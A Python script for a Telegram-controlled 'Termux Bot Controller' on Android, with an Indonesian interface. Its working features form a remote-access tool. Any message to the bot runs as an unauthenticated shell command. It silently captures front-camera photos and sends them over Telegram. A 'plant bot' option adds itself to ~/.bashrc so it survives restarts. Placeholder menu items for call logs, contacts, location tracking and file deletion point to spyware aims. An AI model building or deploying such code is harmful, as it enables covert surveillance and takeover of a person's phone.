#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bot Telegram Termux Controller
Developed for Termux Android Environment
Author: Assistant
Version: 1.0
"""

import os
import sys
import json
import time
import subprocess
import threading
import logging
from datetime import datetime
import requests
import psutil
import shutil
from pathlib import Path

# Auto install required packages
def install_requirements():
    packages = [
        'python-telegram-bot==20.7',
        'psutil',
        'requests',
        'pillow',
        'python-dotenv'
    ]
    
    for package in packages:
        try:
            __import__(package.split('==')[0].replace('-', '_'))
        except ImportError:
            print(f"📦 Installing {package}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], 
                         capture_output=True, text=True)

# Install requirements first
install_requirements()

import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from dotenv import load_dotenv
from PIL import Image

# Load environment variables
load_dotenv()

# Configuration
class Config:
    def __init__(self):
        self.bot_token = self.get_token()
        self.chat_id = None
        self.bot_active = True
        self.auto_start = False
        
    def get_token(self):
        # Try to get token from environment or config file
        token = os.getenv('BOT_TOKEN')
        if not token:
            config_file = 'bot_config.json'
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    config = json.load(f)
                    token = config.get('bot_token')
        
        if not token:
            print("🤖 Setup Bot Token")
            print("=" * 50)
            token = input("Masukkan Bot Token Telegram: ").strip()
            self.save_config(token)
        
        return token
    
    def save_config(self, token):
        config = {
            'bot_token': token,
            'auto_start': self.auto_start
        }
        with open('bot_config.json', 'w') as f:
            json.dump(config, f, indent=2)
        
        # Create .env file
        with open('.env', 'w') as f:
            f.write(f"BOT_TOKEN={token}\n")

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class TermuxBot:
    def __init__(self):
        self.config = Config()
        self.app = None
        self.current_directory = os.path.expanduser('~')
        
    def create_main_keyboard(self):
        """Create main menu keyboard"""
        keyboard = [
            [
                InlineKeyboardButton("📷 Ambil Foto", callback_data="take_photo"),
                InlineKeyboardButton("🔋 Cek Baterai", callback_data="check_battery")
            ],
            [
                InlineKeyboardButton("📩 Lihat Notifikasi", callback_data="view_notifications"),
                InlineKeyboardButton("📞 Log Panggilan", callback_data="call_logs")
            ],
            [
                InlineKeyboardButton("🖼️ Ganti Wallpaper", callback_data="change_wallpaper"),
                InlineKeyboardButton("📶 Info WiFi", callback_data="wifi_info")
            ],
            [
                InlineKeyboardButton("📳 Getarkan Device", callback_data="vibrate_device"),
                InlineKeyboardButton("👥 Kelola Kontak", callback_data="manage_contacts")
            ],
            [
                InlineKeyboardButton("ℹ️ Info Sistem", callback_data="system_info"),
                InlineKeyboardButton("📍 Lacak Lokasi", callback_data="track_location")
            ],
            [
                InlineKeyboardButton("🔒 Kunci Sistem", callback_data="lock_system"),
                InlineKeyboardButton("💾 Backup Gallery", callback_data="backup_gallery")
            ],
            [
                InlineKeyboardButton("🗂️ Folder Lock", callback_data="folder_lock"),
                InlineKeyboardButton("🗑️ Hapus File", callback_data="remove_files")
            ],
            [
                InlineKeyboardButton("💻 Terminal Termux", callback_data="termux_terminal"),
                InlineKeyboardButton("⚙️ Pengaturan Bot", callback_data="bot_settings")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    def create_settings_keyboard(self):
        """Create settings keyboard"""
        status = "🟢 ON" if self.config.bot_active else "🔴 OFF"
        auto_status = "🟢 ON" if self.config.auto_start else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton(f"Bot Status: {status}", callback_data="toggle_bot")],
            [InlineKeyboardButton(f"Auto Start: {auto_status}", callback_data="toggle_auto_start")],
            [InlineKeyboardButton("🌱 Tanam Bot", callback_data="plant_bot")],
            [InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        self.config.chat_id = update.effective_chat.id
        
        welcome_message = f"""
🤖 **TERMUX BOT CONTROLLER** 🤖
═══════════════════════════════

👋 Selamat datang, {user.first_name}!

🔥 **Bot Termux Controller siap digunakan!**

✨ **Fitur Utama:**
• 📷 Kontrol kamera & ambil foto
• 🔋 Monitor sistem real-time  
• 📱 Kelola notifikasi & panggilan
• 🖼️ Atur wallpaper & gallery
• 📶 Monitor jaringan WiFi
• 👥 Kelola kontak WhatsApp
• 🔒 Keamanan sistem
• 💻 Terminal Termux penuh

🚀 **Gunakan menu di bawah untuk memulai!**
        """
        
        await update.message.reply_text(
            welcome_message,
            reply_markup=self.create_main_keyboard(),
            parse_mode='Markdown'
        )

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        if not self.config.bot_active and query.data != "toggle_bot" and query.data != "bot_settings":
            await query.edit_message_text("🔴 Bot sedang tidak aktif. Aktifkan melalui pengaturan.")
            return

        # Handle different button callbacks
        if query.data == "main_menu":
            await self.show_main_menu(query)
        elif query.data == "take_photo":
            await self.take_photo(query)
        elif query.data == "check_battery":
            await self.check_battery(query)
        elif query.data == "view_notifications":
            await self.view_notifications(query)
        elif query.data == "call_logs":
            await self.get_call_logs(query)
        elif query.data == "change_wallpaper":
            await self.change_wallpaper(query)
        elif query.data == "wifi_info":
            await self.get_wifi_info(query)
        elif query.data == "vibrate_device":
            await self.vibrate_device(query)
        elif query.data == "manage_contacts":
            await self.manage_contacts(query)
        elif query.data == "system_info":
            await self.get_system_info(query)
        elif query.data == "track_location":
            await self.track_location(query)
        elif query.data == "lock_system":
            await self.lock_system(query)
        elif query.data == "backup_gallery":
            await self.backup_gallery(query)
        elif query.data == "folder_lock":
            await self.folder_lock(query)
        elif query.data == "remove_files":
            await self.remove_files(query)
        elif query.data == "termux_terminal":
            await self.termux_terminal(query)
        elif query.data == "bot_settings":
            await self.bot_settings(query)
        elif query.data == "toggle_bot":
            await self.toggle_bot(query)
        elif query.data == "toggle_auto_start":
            await self.toggle_auto_start(query)
        elif query.data == "plant_bot":
            await self.plant_bot(query)

    async def show_main_menu(self, query):
        """Show main menu"""
        message = """
🤖 **TERMUX BOT CONTROLLER**
═══════════════════════════════

🔥 **Dashboard Utama**
Pilih fitur yang ingin digunakan:
        """
        await query.edit_message_text(
            message,
            reply_markup=self.create_main_keyboard(),
            parse_mode='Markdown'
        )

    async def take_photo(self, query):
        """Take photo using front camera"""
        await query.edit_message_text("📷 Mengambil foto dari kamera depan...")
        
        try:
            # Use termux-camera-photo to take picture
            result = subprocess.run([
                'termux-camera-photo', 
                '-c', '1',  # Front camera
                '/tmp/photo.jpg'
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and os.path.exists('/tmp/photo.jpg'):
                # Send photo to telegram
                with open('/tmp/photo.jpg', 'rb') as photo:
                    await query.message.reply_photo(
                        photo=photo,
                        caption="📷 Foto berhasil diambil dari kamera depan!"
                    )
                
                # Remove temporary file
                os.remove('/tmp/photo.jpg')
                
                await query.edit_message_text(
                    "✅ Foto berhasil diambil dan dikirim!",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")
                    ]])
                )
            else:
                raise Exception("Gagal mengambil foto")
                
        except Exception as e:
            await query.edit_message_text(
                f"❌ Gagal mengambil foto: {str(e)}\n\n💡 Pastikan izin kamera sudah diberikan ke Termux",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")
                ]])
            )

    async def check_battery(self, query):
        """Check battery status"""
        await query.edit_message_text("🔋 Mengecek status baterai...")
        
        try:
            result = subprocess.run(['termux-battery-status'], 
                                  capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                battery_info = json.loads(result.stdout)
                
                status_icons = {
                    'CHARGING': '🔌',
                    'DISCHARGING': '🔋',
                    'NOT_CHARGING': '🔌',
                    'FULL': '🔋'
                }
                
                health_icons = {
                    'GOOD': '✅',
                    'OVERHEAT': '🔥',
                    'DEAD': '💀',
                    'COLD': '🧊'
                }
                
                percentage = battery_info.get('percentage', 0)
                status = battery_info.get('status', 'UNKNOWN')
                health = battery_info.get('health', 'UNKNOWN')
                temperature = battery_info.get('temperature', 0)
                
                # Create battery bar
                bar_length = 20
                filled = int((percentage / 100) * bar_length)
                battery_bar = '█' * filled + '░' * (bar_length - filled)
                
                battery_message = f"""
🔋 **STATUS BATERAI**
═══════════════════════

📊 **Level:** {percentage}%
{battery_bar}

{status_icons.get(status, '🔋')} **Status:** {status}
{health_icons.get(health, '❓')} **Kesehatan:** {health}
🌡️ **Suhu:** {temperature}°C

⏰ **Diperbarui:** {datetime.now().strftime('%H:%M:%S')}
                """
                
                await query.edit_message_text(
                    battery_message,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 Refresh", callback_data="check_battery")],
                        [InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]
                    ]),
                    parse_mode='Markdown'
                )
            else:
                raise Exception("Tidak dapat mengakses informasi baterai")
                
        except Exception as e:
            await query.edit_message_text(
                f"❌ Gagal mengecek baterai: {str(e)}",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")
                ]])
            )

    async def get_system_info(self, query):
        """Get system information"""
        await query.edit_message_text("ℹ️ Mengambil informasi sistem...")
        
        try:
            # Get system info
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            # Get Android info via termux
            android_info = {}
            try:
                result = subprocess.run(['getprop', 'ro.build.version.release'], 
                                      capture_output=True, text=True)
                android_info['version'] = result.stdout.strip()
            except:
                android_info['version'] = 'Unknown'
            
            try:
                result = subprocess.run(['getprop', 'ro.product.model'], 
                                      capture_output=True, text=True)
                android_info['model'] = result.stdout.strip()
            except:
                android_info['model'] = 'Unknown'
            
            system_message = f"""
ℹ️ **INFORMASI SISTEM**
═══════════════════════════

📱 **Device:** {android_info['model']}
🤖 **Android:** {android_info['version']}

💻 **CPU Usage:** {cpu_percent}%
🧠 **RAM:** {memory.percent}% ({memory.used//1024//1024}MB/{memory.total//1024//1024}MB)
💾 **Storage:** {disk.percent}% ({disk.used//1024//1024//1024}GB/{disk.total//1024//1024//1024}GB)

📁 **Directory:** `{self.current_directory}`
⏰ **Waktu:** {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
            """
            
            await query.edit_message_text(
                system_message,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="system_info")],
                    [InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]
                ]),
                parse_mode='Markdown'
            )
            
        except Exception as e:
            await query.edit_message_text(
                f"❌ Gagal mengambil info sistem: {str(e)}",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")
                ]])
            )

    async def termux_terminal(self, query):
        """Show termux terminal interface"""
        terminal_message = f"""
💻 **TERMUX TERMINAL**
═══════════════════════════

📁 **Current Directory:** `{self.current_directory}`

**Contoh perintah:**
• `ls` - Lihat isi folder
• `cd folder_name` - Masuk folder
• `cd ~` - Kembali ke home
• `python script.py` - Jalankan script
• `pkg install nama_package` - Install package

💡 **Ketik perintah langsung di chat!**
        """
        
        await query.edit_message_text(
            terminal_message,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")
            ]]),
            parse_mode='Markdown'
        )

    async def bot_settings(self, query):
        """Show bot settings"""
        settings_message = f"""
⚙️ **PENGATURAN BOT**
═══════════════════════════

🤖 **Status Bot:** {'🟢 Aktif' if self.config.bot_active else '🔴 Tidak Aktif'}
🌱 **Auto Start:** {'🟢 Aktif' if self.config.auto_start else '🔴 Tidak Aktif'}

💡 **Fitur:**
• **Toggle Bot:** Aktifkan/nonaktifkan bot
• **Auto Start:** Bot jalan otomatis saat buka Termux
• **Tanam Bot:** Install auto-start ke sistem
        """
        
        await query.edit_message_text(
            settings_message,
            reply_markup=self.create_settings_keyboard(),
            parse_mode='Markdown'
        )

    async def toggle_bot(self, query):
        """Toggle bot active status"""
        self.config.bot_active = not self.config.bot_active
        status = "🟢 diaktifkan" if self.config.bot_active else "🔴 dinonaktifkan"
        
        await query.edit_message_text(
            f"✅ Bot berhasil {status}!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚙️ Pengaturan", callback_data="bot_settings")],
                [InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]
            ])
        )

    async def toggle_auto_start(self, query):
        """Toggle auto start feature"""
        self.config.auto_start = not self.config.auto_start
        self.config.save_config(self.config.bot_token)
        
        status = "🟢 diaktifkan" if self.config.auto_start else "🔴 dinonaktifkan"
        
        await query.edit_message_text(
            f"✅ Auto Start berhasil {status}!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚙️ Pengaturan", callback_data="bot_settings")],
                [InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]
            ])
        )

    async def plant_bot(self, query):
        """Plant bot for auto-start"""
        await query.edit_message_text("🌱 Menanam bot ke sistem...")
        
        try:
            # Create auto-start script
            script_content = f"""#!/bin/bash
cd {os.getcwd()}
python3 bot.py &
"""
            
            # Write to .bashrc for auto-start
            bashrc_path = os.path.expanduser('~/.bashrc')
            auto_start_line = f"cd {os.getcwd()} && python3 bot.py &"
            
            # Check if already exists
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    content = f.read()
                if auto_start_line not in content:
                    with open(bashrc_path, 'a') as f:
                        f.write(f"\n# Termux Bot Auto Start\n{auto_start_line}\n")
            else:
                with open(bashrc_path, 'w') as f:
                    f.write(f"# Termux Bot Auto Start\n{auto_start_line}\n")
            
            self.config.auto_start = True
            self.config.save_config(self.config.bot_token)
            
            await query.edit_message_text(
                "✅ Bot berhasil ditanam ke sistem!\n\n🌱 Bot akan otomatis jalan saat Termux dibuka.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⚙️ Pengaturan", callback_data="bot_settings")],
                    [InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]
                ])
            )
            
        except Exception as e:
            await query.edit_message_text(
                f"❌ Gagal menanam bot: {str(e)}",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Pengaturan", callback_data="bot_settings")
                ]])
            )

    # Placeholder methods for other features
    async def view_notifications(self, query):
        await query.edit_message_text("📩 Fitur notifikasi akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def get_call_logs(self, query):
        await query.edit_message_text("📞 Fitur log panggilan akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def change_wallpaper(self, query):
        await query.edit_message_text("🖼️ Fitur ganti wallpaper akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def get_wifi_info(self, query):
        await query.edit_message_text("📶 Fitur info WiFi akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def vibrate_device(self, query):
        await query.edit_message_text("📳 Fitur getaran akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def manage_contacts(self, query):
        await query.edit_message_text("👥 Fitur kelola kontak akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def track_location(self, query):
        await query.edit_message_text("📍 Fitur lacak lokasi akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def lock_system(self, query):
        await query.edit_message_text("🔒 Fitur kunci sistem akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def backup_gallery(self, query):
        await query.edit_message_text("💾 Fitur backup gallery akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def folder_lock(self, query):
        await query.edit_message_text("🗂️ Fitur folder lock akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def remove_files(self, query):
        await query.edit_message_text("🗑️ Fitur hapus file akan segera tersedia!", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]))

    async def handle_terminal_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle terminal commands"""
        command = update.message.text.strip()
        
        if not self.config.bot_active:
            await update.message.reply_text("🔴 Bot sedang tidak aktif.")
            return
        
        try:
            # Handle cd command specially
            if command.startswith('cd '):
                path = command[3:].strip()
                if path == '~':
                    self.current_directory = os.path.expanduser('~')
                else:
                    new_path = os.path.join(self.current_directory, path)
                    if os.path.exists(new_path) and os.path.isdir(new_path):
                        self.current_directory = os.path.abspath(new_path)
                    else:
                        await update.message.reply_text(f"❌ Directory tidak ditemukan: {path}")
                        return
                
                await update.message.reply_text(f"📁 Changed directory to: `{self.current_directory}`", 
                                              parse_mode='Markdown')
                return
            
            # Execute other commands
            result = subprocess.run(
                command, 
                shell=True, 
                cwd=self.current_directory,
                capture_output=True, 
                text=True, 
                timeout=30
            )
            
            output = result.stdout + result.stderr
            if not output:
                output = "✅ Command executed successfully (no output)"
            
            # Limit output length
            if len(output) > 3000:
                output = output[:3000] + "\n\n... (output truncated)"
            
            await update.message.reply_text(f"```\n{output}\n```", parse_mode='Markdown')
            
        except subprocess.TimeoutExpired:
            await update.message.reply_text("⏰ Command timeout (30s limit)")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        logger.error(f"Exception while handling an update: {context.error}")

    def run(self):
        """Run the bot"""
        print("\n" + "="*50)
        print("🤖 TERMUX BOT CONTROLLER")
        print("="*50)
        print("🚀 Starting bot...")
        print(f"📁 Working directory: {os.getcwd()}")
        print(f"🔗 Bot Token: {self.config.bot_token[:10]}...")
        
        try:
            # Create application
            self.app = Application.builder().token(self.config.bot_token).build()
            
            # Add handlers
            self.app.add_handler(CommandHandler("start", self.start_command))
            self.app.add_handler(CallbackQueryHandler(self.button_handler))
            self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_terminal_command))
            self.app.add_error_handler(self.error_handler)
            
            print("✅ Bot successfully started!")
            print("💬 Kirim /start di Telegram untuk memulai")
            print("🔄 Press Ctrl+C to stop")
            print("="*50)
            
            # Run the bot
            self.app.run_polling(allowed_updates=Update.ALL_TYPES)
            
        except Exception as e:
            print(f"❌ Error starting bot: {e}")
            sys.exit(1)

def main():
    """Main function"""
    bot = TermuxBot()
    bot.run()

if __name__ == "__main__":
    main()
